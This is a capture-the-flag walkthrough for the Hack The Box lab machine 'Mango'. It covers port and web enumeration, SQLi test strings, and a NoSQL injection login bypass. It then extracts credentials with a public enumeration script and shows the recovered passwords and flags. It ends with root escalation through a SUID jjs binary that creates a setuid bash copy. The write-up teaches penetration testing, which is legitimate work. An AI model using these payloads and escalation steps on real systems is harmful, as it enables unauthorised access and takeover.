---
description: 10.10.10.162
---

# Mango

![](<../../.gitbook/assets/1 (7) (1) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - NoSQLi to get creds for two users. SSH as user "mango" and su to user "admin".
* Root - SUID binary jjs

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.162
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-17 09:11 EST
Nmap scan report for 10.10.10.162
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 22.66 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A --version-all -p 22,80,443 10.10.10.162 -n               
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-17 09:17 EST
Nmap scan report for 10.10.10.162
Host is up (0.016s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Android 4.1.1 (93%), Android 4.2.2 (Linux 3.4) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   22.16 ms 10.10.14.1
2   22.32 ms 10.10.10.162

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.64 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.162/ 
http://10.10.10.162/ [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.162], Title[403 Forbidden]  

└─$ whatweb https://10.10.10.162/         
https://10.10.10.162/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.162], Script, Title[Mango | Search Base] 

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.162 -q -k -x php
/index.php (Status: 200)
/analytics.php (Status: 200)
/server-status (Status: 403)

```

### SSLscan

Let's run an SSL scan against the target on the HTTPS port:

```
└─$ sslscan --no-ciphersuites --no-cipher-details --no-groups --no-heartbleed --no-compression --no-renegotiation --show-certificate 10.10.10.162:443 
Version: 2.0.10-static
OpenSSL 1.1.1l-dev  xx XXX xxxx

Connected to 10.10.10.162

Testing SSL server 10.10.10.162 on port 443 using SNI name 10.10.10.162

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV


  SSL Certificate:
    Certificate blob:
-----BEGIN CERTIFICATE-----
MIIEAjCCAuqgAwIBAgIJAK5QiSmoBvEyMA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD
VQQGEwJJTjENMAsGA1UECAwETm9uZTENMAsGA1UEBwwETm9uZTEXMBUGA1UECgwO
TWFuZ28gUHJ2IEx0ZC4xDTALBgNVBAsMBE5vbmUxIDAeBgNVBAMMF3N0YWdpbmct
b3JkZXIubWFuZ28uaHRiMR4wHAYJKoZIhvcNAQkBFg9hZG1pbkBtYW5nby5odGIw
HhcNMTkwOTI3MTQyMTE5WhcNMjAwOTI2MTQyMTE5WjCBlTELMAkGA1UEBhMCSU4x
DTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUxFzAVBgNVBAoMDk1hbmdvIFBy
diBMdGQuMQ0wCwYDVQQLDAROb25lMSAwHgYDVQQDDBdzdGFnaW5nLW9yZGVyLm1h
bmdvLmh0YjEeMBwGCSqGSIb3DQEJARYPYWRtaW5AbWFuZ28uaHRiMIIBIjANBgkq
hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5fimSfgq3xsdUkZ6dcbqGPDmCAJJBOK2
f5a25At3Ht5r1SjiIuvovDSmMHjVmlbF6qX7C6f7Um+1Vtv/BinZfpuMEesyDH0V
G/4X5r6o1GMfrvjvAXQ2cuVEIxHGH17JM6gKKEppnguFwVMhC4/KUIjuaBXX9udA
9eaFJeiYEpdfSUVysoxQDdiTJhwyUIPnsFrf021nVOI1/TJkHAgLzxl1vxrMnwrL
2fLygDt1IQN8UhGF/2UTk3lVfEse2f2kvv6GbmjxBGfWCNA/Aj810OEGVMiS5SLr
arIXCGVl953QCD9vi+tHB/c+ICaTtHd0Ziu/gGbdKdCItND1r9kOEQIDAQABo1Mw
UTAdBgNVHQ4EFgQUha2bBOZXo4EyfovW+pvFLGVWBREwHwYDVR0jBBgwFoAUha2b
BOZXo4EyfovW+pvFLGVWBREwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsF
AAOCAQEAmyhYweHz0az0j6UyTYlUAUKY7o/wBHE55UcekmWi0XVdIseUxBGZasL9
HJki3dQ0mOEW4Ej28StNiDKPvWJhTDLA1ZjUOaW2Jg20uDcIiJ98XbdBvSgjR6FJ
JqtPYnhx7oOigKsBGYXXYAxoiCFarcyPyB7konNuXUqlf7iz2oLl/FsvJEl+YMgZ
YtrgOLbEO6/Lot/yX9JBeG1z8moJ0g+8ouCbUYI1Xcxipp0Cp2sK1nrfHEPaSjBB
Os2YQBdvVXJau7pt9zJmPVMhrLesf+bW5CN0WpC/AE1M1j6AfkX64jKpIMS6KAUP
/UKaUcFaDwjlaDEvbXPdwpmk4vVWqg==
-----END CERTIFICATE-----
    Version: 2
    Serial Number: ae:50:89:29:a8:06:f1:32
    Signature Algorithm: sha256WithRSAEncryption
    Issuer: /C=IN/ST=None/L=None/O=Mango Prv Ltd./OU=None/CN=staging-order.mango.htb/emailAddress=admin@mango.htb
    Not valid before: Sep 27 14:21:19 2019 GMT
    Not valid after: Sep 26 14:21:19 2020 GMT
    Subject: /C=IN/ST=None/L=None/O=Mango Prv Ltd./OU=None/CN=staging-order.mango.htb/emailAddress=admin@mango.htb
    Public Key Algorithm: NULL
    RSA Public Key: (2048 bit)
      RSA Public-Key: (2048 bit)
      Modulus:
          00:e5:f8:a6:49:f8:2a:df:1b:1d:52:46:7a:75:c6:
          ea:18:f0:e6:08:02:49:04:e2:b6:7f:96:b6:e4:0b:
          77:1e:de:6b:d5:28:e2:22:eb:e8:bc:34:a6:30:78:
          d5:9a:56:c5:ea:a5:fb:0b:a7:fb:52:6f:b5:56:db:
          ff:06:29:d9:7e:9b:8c:11:eb:32:0c:7d:15:1b:fe:
          17:e6:be:a8:d4:63:1f:ae:f8:ef:01:74:36:72:e5:
          44:23:11:c6:1f:5e:c9:33:a8:0a:28:4a:69:9e:0b:
          85:c1:53:21:0b:8f:ca:50:88:ee:68:15:d7:f6:e7:
          40:f5:e6:85:25:e8:98:12:97:5f:49:45:72:b2:8c:
          50:0d:d8:93:26:1c:32:50:83:e7:b0:5a:df:d3:6d:
          67:54:e2:35:fd:32:64:1c:08:0b:cf:19:75:bf:1a:
          cc:9f:0a:cb:d9:f2:f2:80:3b:75:21:03:7c:52:11:
          85:ff:65:13:93:79:55:7c:4b:1e:d9:fd:a4:be:fe:
          86:6e:68:f1:04:67:d6:08:d0:3f:02:3f:35:d0:e1:
          06:54:c8:92:e5:22:eb:6a:b2:17:08:65:65:f7:9d:
          d0:08:3f:6f:8b:eb:47:07:f7:3e:20:26:93:b4:77:
          74:66:2b:bf:80:66:dd:29:d0:88:b4:d0:f5:af:d9:
          0e:11
      Exponent: 65537 (0x10001)
    X509v3 Extensions:
      X509v3 Subject Key Identifier: 
        85:AD:9B:04:E6:57:A3:81:32:7E:8B:D6:FA:9B:C5:2C:65:56:05:11
      X509v3 Authority Key Identifier: 
        keyid:85:AD:9B:04:E6:57:A3:81:32:7E:8B:D6:FA:9B:C5:2C:65:56:05:11

      X509v3 Basic Constraints: critical
        CA:TRUE
  Verify Certificate:
    self signed certificate

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  staging-order.mango.htb
Issuer:   staging-order.mango.htb

Not valid before: Sep 27 14:21:19 2019 GMT
Not valid after:  Sep 26 14:21:19 2020 GMT

```

The output reveals the following interesting bits of information:

> CN=staging-order.mango.htb/emailAddress=admin@mango.htb

Let's add the following line to our /etc/hosts file:

> 10.10.10.162  staging-order.mango.htb mango.htb

### Dirb

Let's run a dirb scan against the two entries we added to our hosts file:

```
└─$ dirb http://staging-order.mango.htb/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Nov 18 04:00:44 2021
URL_BASE: http://staging-order.mango.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://staging-order.mango.htb/ ----
+ http://staging-order.mango.htb/index.php (CODE:200|SIZE:4022)                                                  
+ http://staging-order.mango.htb/server-status (CODE:403|SIZE:288)                                               
==> DIRECTORY: http://staging-order.mango.htb/vendor/                                                            
                                                                                                                 
---- Entering directory: http://staging-order.mango.htb/vendor/ ----
==> DIRECTORY: http://staging-order.mango.htb/vendor/composer/                                                   
                                                                                                                 
---- Entering directory: http://staging-order.mango.htb/vendor/composer/ ----
+ http://staging-order.mango.htb/vendor/composer/LICENSE (CODE:200|SIZE:2918)                                    
                                                                                                                 
-----------------
END_TIME: Thu Nov 18 04:04:27 2021
DOWNLOADED: 13836 - FOUND: 3

└─$ dirb http://mango.htb/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Nov 18 04:16:15 2021
URL_BASE: http://mango.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://mango.htb/ ----
+ http://mango.htb/server-status (CODE:403|SIZE:274)                                                             
                                                                                                                 
-----------------
END_TIME: Thu Nov 18 04:17:31 2021
DOWNLOADED: 4612 - FOUND: 1

```

## Website exploration

We can visit the sites we have found and look around. The two HTTPS sites look the same, as shown below:

![](<../../.gitbook/assets/2 (3) (1).JPG>)

The page at http://mango.htb is forbidden, and the login page at http://staging-order.mango.htb is shown below:

![](<../../.gitbook/assets/3 (2) (1) (1).JPG>)

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* There does not appear to be anything hosted on http://mango.htb, all we get is a Forbidden error, however at http://staging-order.mango.htb/ we find a login page
* Both https://mango.htb and https://staging-order.mango.htb take us to the Mango search engine

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* No scripts are loaded for the main page on both https sites (Mango search)
* Some javascript is used on the analytics page, but seems to be defaults without any information leakage

​Summary of what we have found thus far:

> https://mango.htb --> Mango search engine and analytics page, seems to be a deadend
>
> https://staging-order.mango.htb --> Mango search engine and analytics page, seems to be a deadend
>
> http://mango.htb --> Forbidden
>
> http://staging-order.mango.htb --> login form

### SQL Injection

Let's test the login page for SQLi vulnerabilities. First, we'll run BURP and configure the browser to use it. Next, turn on intercept and attempt a login. Since this is a POST request, the login information is contained within the body of the request. In BURP, send the request to the repeater and click go:

![](<../../.gitbook/assets/4 (3) (1) (1).JPG>)

Looking at the response, there is nothing to indicate that the login failed, aside from the fact that we are presented with the Login page again. There are no error messages.

Let's test the "username" field with the following basic payloads:

```
username=admin'&password=admin&login=login
username=admin')&password=admin&login=login
username=admin"&password=admin&login=login
username=admin' or 1=1-- &password=admin&login=login
username=admin' and 1=1-- &password=admin&login=login
username=admin' or '1'='1-- &password=admin&login=login
username=admin' and '1'='1-- &password=admin&login=login
username=admin or 1=1-- &password=admin&login=login
username=admin and 1=1-- &password=admin&login=login
```

None of the above payloads results in any changes to the returned page. We repeat the process with a random string of characters instead of "admin", also without success. We also test the "password" parameter and even the "login" parameter, all without success.&#x20;

Since we don't know for sure what kind of database is running on the target, we could reason that a) there is no database and this is another dead end, b) there is a sql injection vulnerability but we have not found it yet, c) this is a nosql database.

Before we delve to deep into further testing for SQLi, let's try some basic NoSQL injections first.

### NoSQL

The following pages contain very nice introductions to NoSQL databases, and I highly recommend you check it out:

{% embed url="https://www.freecodecamp.org/news/nosql-databases-5f6639ed9574" %}

{% embed url="https://www.mongodb.com/nosql-explained" %}

Let's test the login parameters with the following basic payloads:

> username\[$ne]=wronguser\&password\[$ne]=wrongpwd\&login=login

![](<../../.gitbook/assets/5 (2) (1).JPG>)

We get a response message with a redirect to home.php. We have just bypassed the login page, and after being redirected, we end up at the page shown below:

![](<../../.gitbook/assets/6 (2) (1).JPG>)

Ok, now what? We review the page source but there is nothing of interest. However, since we know there is a NoSQLi in the login form, let's attempt to extract data from the database using the vulnerable form.

To do this, we'll use the following python script:

{% embed url="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" %}

Let's clone the repo and run it against the target. First, we'll run it to extract the usernames and then the passwords as follows:

```
└─$ python3 nosqli.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep username -op login:login -m POST 
Pattern found that starts with 'a'
Pattern found: ad                                                                                                 
Pattern found: adm                                                                                                
Pattern found: admi                                                                                               
Pattern found: admin                                                                                              
username found: admin                                                                                             
Pattern found that starts with 'm'                                                                                
Pattern found: ma                                                                                                 
Pattern found: man                                                                                                
Pattern found: mang                                                                                               
Pattern found: mango                                                                                              
username found: mango                                                                                             
                                                                                                                  
2 username(s) found:                                                                                              
admin                                                                                                             
mango

└─$ python3 nosqli.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep username -ep password -op login:login -m POST 
Pattern found that starts with 'h'
Pattern found: h3                                                                                                 
Pattern found: h3m                                                                                                
Pattern found: h3mX                                                                                               
Pattern found: h3mXK                                                                                              
Pattern found: h3mXK8                                                                                             
Pattern found: h3mXK8R                                                                                            
Pattern found: h3mXK8Rh                                                                                           
Pattern found: h3mXK8RhU                                                                                          
Pattern found: h3mXK8RhU~                                                                                         
Pattern found: h3mXK8RhU~f                                                                                        
Pattern found: h3mXK8RhU~f{                                                                                       
Pattern found: h3mXK8RhU~f{]                                                                                      
Pattern found: h3mXK8RhU~f{]f                                                                                     
Pattern found: h3mXK8RhU~f{]f5                                                                                    
Pattern found: h3mXK8RhU~f{]f5H                                                                                   
password found: h3mXK8RhU~f{]f5H                                                                                  
Pattern found that starts with 't'                                                                                
Pattern found: t9                                                                                                 
Pattern found: t9K                                                                                                
Pattern found: t9Kc                                                                                               
Pattern found: t9KcS                                                                                              
Pattern found: t9KcS3                                                                                             
Pattern found: t9KcS3>                                                                                            
Pattern found: t9KcS3>!                                                                                           
Pattern found: t9KcS3>!0                                                                                          
Pattern found: t9KcS3>!0B                                                                                         
Pattern found: t9KcS3>!0B#                                                                                        
Pattern found: t9KcS3>!0B#2                                                                                       
password found: t9KcS3>!0B#2                                                                                      
                                                                                                                  
2 password(s) found:                                                                                              
h3mXK8RhU~f{]f5H                                                                                                  
t9KcS3>!0B#2                                                                                                      
                
```

The script extracts two usernames and two passwords, let's test them on the login page. The following two combinations work:at&#x20;

admin:t9KcS3>!0B#2

mango:h3mXK8RhU\~f{]f5H

## Gaining Access

We know that port 22 is open on the target, so let's try and connect via SSH using the creds above. The "admin" creds doesn't work, however, we are able to login as the "mango" user.

```
└─$ ssh mango@10.10.10.162                                                                                  130 ⨯
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Nov 18 14:17:19 UTC 2021

  System load:  0.01               Processes:            102
  Usage of /:   33.4% of 19.56GB   Users logged in:      0
  Memory usage: 29%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Nov 18 03:25:53 2021 from 10.10.14.2
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
mango@mango:~$ ls
mango@mango:~$​
```

Looking around, we find the "admin" users' home directory, which contains the user flag. The flag is only readable by the "admin" user. Let's see if we can switch user to "admin" using the creds we found. We successfully "su" to "admin" and we are now able to read the user flag.aer l

```
mango@mango:/home/admin$ su admin
Password: 
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/$ cd ~
admin@mango:/home/admin$ ls
user.txt
admin@mango:~$ cat user.txt
7337777db1aa717714cb81eed329d0d1
admin@mango:/home/admin$

```

## Privilege Escalation

Let's check for SUID binaries:

```
admin@mango:/home/admin$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
/snap/core/7713/bin/mount
/snap/core/7713/bin/ping
/snap/core/7713/bin/ping6
/snap/core/7713/bin/su
/snap/core/7713/bin/umount
/snap/core/7713/usr/bin/chfn
/snap/core/7713/usr/bin/chsh
/snap/core/7713/usr/bin/gpasswd
/snap/core/7713/usr/bin/newgrp
/snap/core/7713/usr/bin/passwd
/snap/core/7713/usr/bin/sudo
/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7713/usr/lib/openssh/ssh-keysign
/snap/core/7713/usr/lib/snapd/snap-confine
/snap/core/7713/usr/sbin/pppd
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/run-mailcap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
admin@mango:/home/admin$ 
```

Going through the list, we find the "jjs" binary. Looking on GTFObins, there is an entry for it, however, it states that the SUID privesc doesn't work on Linux.m

{% embed url="https://gtfobins.github.io/gtfobins/jjs" %}

What exactly is "jjs". The below explanation was taken from the referenced site:

{% hint style="info" %}
The Nashorn Javascript Engine is part of Java SE 8 and competes with other standalone engines like Google V8 (the engine that powers Google Chrome and Node.js). Nashorn extends Javas capabilities by running dynamic javascript code natively on the JVM.

The Nashorn javascript engine can either be used programmatically from java programs or by utilizing the command line tool jjs.

[https://winterbe.com/posts/2014/04/05/java8-nashorn-tutorial/](https://winterbe.com/posts/2014/04/05/java8-nashorn-tutorial/)
{% endhint %}

A google search for ""jjs" suid" finds the following article, which relates mostly to running the tool on Windows, but does have some Linux examples as well. The article indicates that we could use "jjs" to get a shell, which is perfect for our scenario, as we are attempting to get a shell as root.

{% embed url="https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything" %}

Despite all the good information in the above article, I decided to have a look at the "jjs" documentation at the following page:

{% embed url="https://docs.oracle.com/javase/8/docs/technotes/guides/scripting/nashorn/shell.html" %}

According to the above page, if we run the command "jjs -scripting" it will give us an interactive prompt which includes several global objects, one of which is "$EXEC()". This function will allow us to run OS commands from within the "jjs" environment.

Let's test it:

```
admin@mango:/home/admin$ jjs -scripting
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> $EXEC("id")
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)

jjs> quit()
admin@mango:/home/mango$
```

Nice, our effective user ID is root. Let's use this vulnerability to get a root shell.

To do so, I'll copy "/bin/bash" to "/tmp/", run "chown" and "chmod" on it to change the ownership to "root" and to make it a SUID binary.&#x20;

```
admin@mango:/home/mango$ jjs -scripting
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> $EXEC("cp /bin/bash /tmp/r00t; chown root:root /tmp/r00t; chmod u+s /tmp/r00t")

jjs> quit()
admin@mango:/home/mango$ ls -la /tmp/r00t
-rwsr-xr-x 1 root root 1113504 Nov 18 15:43 /tmp/r00t
admin@mango:/home/mango$
```

All we need to do now is run the new SUID binary and grab the root flag.

```
admin@mango:/home/mango$ /tmp/r00t -p
r00t-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
r00t-4.4# cat /root/root.txt
35d0be95f135d7c9c4c3f58c20b6e978
r00t-4.4#
```

## Resources

Mongodb is a NoSQL database which stores documents using the JSON format. For more information about this check out the following page:

{% embed url="https://www.mongodb.com/basics" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/nosql-injection" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" %}

{% embed url="https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf" %}

{% embed url="https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html" %}



